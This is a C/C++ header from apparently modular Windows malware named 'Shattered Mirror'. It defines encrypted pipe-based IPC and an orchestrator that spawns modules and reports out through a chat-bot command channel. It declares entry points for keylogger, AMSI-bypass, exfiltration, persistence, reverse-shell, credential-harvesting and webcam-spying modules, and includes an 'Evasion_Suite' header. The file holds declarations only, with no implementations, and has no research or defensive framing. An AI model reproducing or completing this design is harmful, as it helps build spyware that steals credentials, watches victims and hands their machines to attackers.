#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: Atom Manager & IPC Definitions
 * OPTION B: Orchestrator hosts both command and report pipe servers.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_MANAGER_H
#define SMIRROR_ATOM_MANAGER_H

#include "../Evasion_Suite/include/common.h"
#include <string>

/*---------------------------------------------------------------------------
 * IPC Command Structures
 *-------------------------------------------------------------------------*/
#define MAX_IPC_PAYLOAD_SIZE 65536

typedef enum _ATOM_COMMAND_ID {
  CMD_HEARTBEAT = 0x01,
  CMD_EXECUTE = 0x02,
  CMD_REPORT = 0x03,
  CMD_TERMINATE = 0x04,
  CMD_SPAWN_ATOM = 0x05,     // Bale bot requests atom spawn
  CMD_FORWARD_REPORT = 0x06, // Orchestrator forwards atom output to Bale
  CMD_READY = 0x07,          // Atom signals it is ready to receive commands
  CMD_REPORT_ACK = 0x08,     // Acknowledgement that a report was received
  CMD_BALE_REPORT = 0x09,    // Telegram-bound binary/structured report
  CMD_STOP_ALL = 0x0A        // Kill all non-core task atoms
} ATOM_COMMAND_ID;

typedef struct _IPC_MESSAGE {
  DWORD dwSignature; /* 0x534D4952 "SMIR" */
  ATOM_COMMAND_ID CommandId;
  DWORD AtomId; /* Target Atom ID for routing (e.g., 10 for Shell) */
  DWORD dwPayloadLen;
  BYTE Payload[MAX_IPC_PAYLOAD_SIZE];
} IPC_MESSAGE, *PIPC_MESSAGE;

/*---------------------------------------------------------------------------
 * Atom Tracking Structures
 *-------------------------------------------------------------------------*/
typedef enum _ATOM_STATUS {
  ATOM_STATUS_UNINITIALIZED = 0,
  ATOM_STATUS_STARTING = 1,
  ATOM_STATUS_RUNNING = 2,
  ATOM_STATUS_DEAD = 3
} ATOM_STATUS;

typedef struct _ATOM_RECORD {
  DWORD dwAtomId;
  HANDLE hProcess;    /* Process hosting the atom */
  HANDLE hReportPipe; /* Server pipe handle for receiving REPORTS from atom
                         (Orchestrator reads) */
  HANDLE hCmdPipe;    /* Server pipe handle for sending COMMANDS to atom
                         (Orchestrator writes) */
  ATOM_STATUS Status;
  DWORD dwLastHeartbeat; /* Tick count of last received heartbeat */
  BOOL bBaleRouted;      /* TRUE if output goes to Bale bot */
  HANDLE hBalePipe;      /* Pipe handle to Bale bot (if routed) */
  DWORD OwnerAtomId;     /* ID of the atom that spawned this one (0 = Orchestrator) */
  char pendingCommand[MAX_IPC_PAYLOAD_SIZE]; /* Command to send when atom is
                                                ready (fallback) */
  DWORD pendingCommandLen;                   /* Length of pending command */
} ATOM_RECORD, *PATOM_RECORD;

#define MAX_ATOMS 15 /* Atoms are 1-indexed (1..14), slot 0 unused */

/*---------------------------------------------------------------------------
 * IPC Functions (Directional Pipes – Option B)
 *-------------------------------------------------------------------------*/

/* Orchestrator side: Create server pipe for receiving reports from atom */
HANDLE IPC_CreateReportServerPipe(DWORD dwAtomId);

/* Orchestrator side: Create server pipe for sending commands to atom */
HANDLE IPC_CreateCommandServerPipe(DWORD dwAtomId);

/* Atom side: Connect as client to orchestrator's report pipe (to send reports)
 */
HANDLE IPC_ConnectToReportPipe(DWORD dwAtomId);

/* Atom side: Connect as client to orchestrator's command pipe (to receive
 * commands) */
HANDLE IPC_ConnectToCommandPipe(DWORD dwAtomId);

/* Send an encrypted message over a pipe */
BOOL IPC_SendMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE *pEncKey,
                     DWORD dwKeyLen);

/* Receive and decrypt a message from a pipe */
BOOL IPC_ReceiveMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE *pEncKey,
                        DWORD dwKeyLen);

/*---------------------------------------------------------------------------
 * Atom Manager Functions
 *-------------------------------------------------------------------------*/
BOOL InitAtomManager(void);
DWORD WINAPI OrchestratorMain(LPVOID lpParam);
BOOL SpawnAtom(DWORD dwAtomId, const BYTE *pAtomCode, SIZE_T szAtomSize);
void StartAutoAtoms(void);
BOOL StopAtomById(DWORD atom_id);
std::string ListRunningAtoms();
void QueueAtomCommand(DWORD atomId, const char *command, DWORD len);

/* Forward declarations for all Atom entry points */
DWORD WINAPI NetworkAtomMain(LPVOID lpParam);
DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam);
DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam);
DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam);
DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam);
DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam);
DWORD WINAPI PersistenceAtomMain(LPVOID lpParam);
DWORD WINAPI ProcessAtomMain(LPVOID lpParam);
DWORD WINAPI FileSystemAtomMain(LPVOID lpParam);
DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam);
DWORD WINAPI PingAtomMain(LPVOID lpParam);
DWORD WINAPI BaleBotAtomMain(LPVOID lpParam); // Atom 12
DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam); // Atom 13
DWORD WINAPI SpyCamAtomMain(LPVOID lpParam); // Atom 14

#endif /* SMIRROR_ATOM_MANAGER_H */